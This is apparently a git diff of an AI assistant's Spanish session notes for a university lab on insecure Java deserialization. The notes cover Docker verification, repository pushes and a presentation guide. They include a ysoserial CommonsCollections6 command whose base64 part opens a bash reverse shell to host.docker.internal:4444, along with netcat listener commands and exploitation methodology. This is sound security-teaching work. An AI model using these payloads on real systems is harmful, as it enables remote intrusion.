@@ -4,7 +4,9 @@ Seguridad en el Desarrollo de Software, UTN FRC. Cantero Santiago (81658) — Ar
 
 Contexto pa' retomar sesión sin releer todo. Fuente de verdad del laboratorio en sí: `lab-deserializacion/README.md`. Fuente de verdad del proyecto completo: `LAB.md`.
 
-## Estado: laboratorio completo y verificado en Docker real (no simulado). Front reemplazado por tienda demo "TechStore" (ver abajo), también verificado en Docker real. **Última verificación 2026-11-15.**
+## Estado: laboratorio completo y verificado en Docker real (no simulado). Front reemplazado por tienda demo "TechStore" (ver abajo), también verificado en Docker real. Extensión Burp, reverse shell y guía white box agregadas y verificadas. **Repo nuevo creado y pusheado: https://github.com/MrCanter1/Laboratorio-de-Deserializacion-Insegura** (ambas ramas, con `tools/` incluido). **Última verificación 2026-11-16.**
+
+**Estado de containers al cierre de esta sesión: todo apagado/limpio** (`target-app` y `revshell-listener` de prueba, parados y removidos). Para retomar: `docker-compose up -d target-app` desde `lab-deserializacion/` (ver sección "Comandos base" abajo, o README para variantes con puerto 8081 si Burp sigue corriendo).
 
 Resultado verificación (secuencia completa, Docker Desktop levantado):
 - `docker-compose build target-app` → OK
@@ -99,11 +101,15 @@ Campo de comando para la tab Exploiting de Burp (gadget `CommonsCollections6`):
 CommonsCollections6 "/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|bash"
 ```
 
-**Listener en Windows, dos opciones:**
-- `C:\Users\santi\Downloads\nc64.exe -lvnp 4444` (descargado por el usuario, no versionado — si se usa en la demo, mover a `lab-deserializacion/tools/`).
-- `python lab-deserializacion\tools\revshell_listener.py 4444` — script propio, no depende de descargar nada, usa el `python` del WindowsApps que ya está en PATH. Queda en `lab-deserializacion/tools/revshell_listener.py` (sí versionado, es texto chico).
+**Listener en Windows, dos opciones (ambas versionadas en `tools/`):**
+- `lab-deserializacion\tools\nc64.exe -lvnp 4444`
+- `python lab-deserializacion\tools\revshell_listener.py 4444` — script propio, no depende de descargar nada, usa el `python` del WindowsApps que ya está en PATH.
 
 Importante: el listener tiene que estar escuchando ANTES de mandar el ataque, sino falla en silencio.
+
+## Guía White Box — paso a paso para la exposición (agregada 2026-11-16)
+
+`lab-deserializacion/README.md` sección 8 completa: cómo encontrar el sink (`CartController.java:91-97`), identificar la librería/CVE desde `pom.xml`, **elegir el gadget correcto a priori sin fuzzing** (leyendo versión de JDK 8u512 + commons-collections 3.1, se descarta CC1 antes de probarlo), mecánica del gadget chain CC6 línea por línea (HashMap→TiedMapEntry→LazyMap→ChainedTransformer→InvokerTransformer→Runtime.exec, explicado a nivel de programa para que el compañero lo cuente en vivo), por qué la mitigación lo frena (`WhitelistObjectInputStream.java:45-52`), y guión resumido en 5 bullets. Pensada específicamente para el compañero que explica código — complementa (no duplica) el guión de exposición ya publicado como Claude Doc.
 
 ## Documentos ya publicados (Claude Docs, no son archivos locales)
 
@@ -117,11 +123,18 @@ Los tres se linkean entre sí. Si hay que tocar alguno: son docs vivos vía `mcp
 
 ## Git
 
-Repo con rama `feature/tienda-demo-cwe502` activa (parte de `master`, commit base `3e0e522`). Commits de la rama: PRINT_ONLY en `exploit.sh`, tienda demo en `index.html`. **Decisión de merge/PR pendiente — usuario pidió no insistir con esto por ahora, foco en el lab.** Cuando se retome: opciones son merge local a `master`, push+PR, o dejar la rama como está. Atribución commits actuales: `Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>`.
+**Dos remotos configurados** en este repo local:
+- `origin` — el remoto original (si existía antes de esta sesión; no se tocó).
+- `lab-origin` → `https://github.com/MrCanter1/Laboratorio-de-Deserializacion-Insegura.git` — repo nuevo creado por el usuario el 2026-11-16, pedido explícito de "poner ahí todo el laboratorio con las herramientas y todo eso". **Ambas ramas pusheadas** (`master` y `feature/tienda-demo-cwe502`), sin mergear entre sí (decisión explícita del usuario al preguntarle: "ambas ramas, sin mergear" — no asumir merge si no lo pide de nuevo). `tools/` (JDK8 + ysoserial + nc64 + listener, ~250MB) va versionado en ambas ramas — se sacó la entrada del `.gitignore` que lo excluía. GitHub avisó (no bloqueó) por 2 archivos >50MB (`rt.jar` 60MB, `ysoserial jar` 57MB) — sugiere Git LFS, no se implementó, no pedido.
+
+Rama `feature/tienda-demo-cwe502` (parte de `master`, commit base `3e0e522`) tiene la tienda demo "TechStore" — `master` tiene el dashboard viejo de botones, SIN la tienda. **Decisión de merge entre ramas sigue pendiente** — usuario pidió no insistir con esto por ahora. **Pendiente nuevo, no resuelto**: elegir default branch del repo nuevo en GitHub (Settings → Branches) — ahora mismo probablemente quedó `master` por default (primera rama pusheada alfabéticamente/por orden), pero la rama con todo el trabajo completo es `feature/tienda-demo-cwe502`. Se le preguntó al usuario si quería ayuda con esto, no se resolvió en esta sesión. Atribución commits de hoy: `Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>` (ojo, cambió de "5.5" a "5" a mitad de sesión — el sistema lo pidió así, no es inconsistencia a corregir).
 
 ## Pendiente / abierto (no asumir, confirmar con usuario antes de tocar)
 
+- **Elegir default branch en GitHub** del repo nuevo (`lab-origin`) — probablemente quedó `master`, pero el trabajo completo está en `feature/tienda-demo-cwe502`. Se ofreció ayuda, usuario no respondió todavía en esta sesión.
 - **Decidir qué hacer con `feature/tienda-demo-cwe502`** (merge/PR/dejar como está) — pausado a pedido del usuario.
+- **Confirmar CommonsCollections7** con output verificable (el `/bin/sh -c ...>archivo` todavía no se reintentó para CC7, quedó en "Error: null" sin redirección, ver README 6.8).
+- **Git LFS** para `rt.jar`/`ysoserial jar` (GitHub avisó, no bloqueó) — no implementado, no pedido explícitamente.
 - Se evaluó `calc.exe` como PoC visual de RCE y se descartó: `target-app` corre en contenedor Linux, sin entorno gráfico Windows. Se eligió `id` en su lugar (comando arbitrario, salida verificable).
 - **Parametrizar gadget en `exploit.sh`.** Hoy CC6 está hardcodeado (línea ~35, `java -jar "${JAR}" CommonsCollections6 "${CMD}"`). Guión de exposición §4.2 pide mostrar primero CC1 fallando y después CC6 funcionando — hoy eso requiere editar el script a mano en vivo. Si se quiere demo sin editar código en el momento: agregar 4º arg opcional `GADGET` (default `CommonsCollections6`) en `exploit.sh`. **No implementado, no pedido explícitamente — solo flaggeado.**
 - **CVE asociado y búsqueda de PoC — contenido nuevo, charlado en sesión, agregado a `lab-deserializacion/README.md` sección 2.2:** librería vulnerable es `commons-collections:3.1` (`pom.xml`). CVEs: **CVE-2015-7501** (principal, `InvokerTransformer`/`InstantiateFactory`/`InstantiateTransformer`, rango 3.0–3.2.1, fix en 3.2.2, CVSS 9.8) y **CVE-2015-6420** (mismo rango). No hay entrada propia en Exploit-DB — PoC vive en GitHub: [frohoff/ysoserial](https://github.com/frohoff/ysoserial) (el que ya usa `exploit/Dockerfile`) y [grrrdog/java-deserialization-cheat-sheet](https://github.com/grrrdog/java-deserialization-cheat-sheet) como mapa de referencia. Metodología completa de detección/explotación caja negra sin ver código (firma de bytes `0xACED`/`rO0`, comportamiento ante basura, fingerprint de gadget chain, confirmación de RCE ciego por out-of-band/time-based) → README sección 2.1. **Pendiente: decidir si esto entra al informe/exposición o queda solo de referencia para responder preguntas en la entrega.**
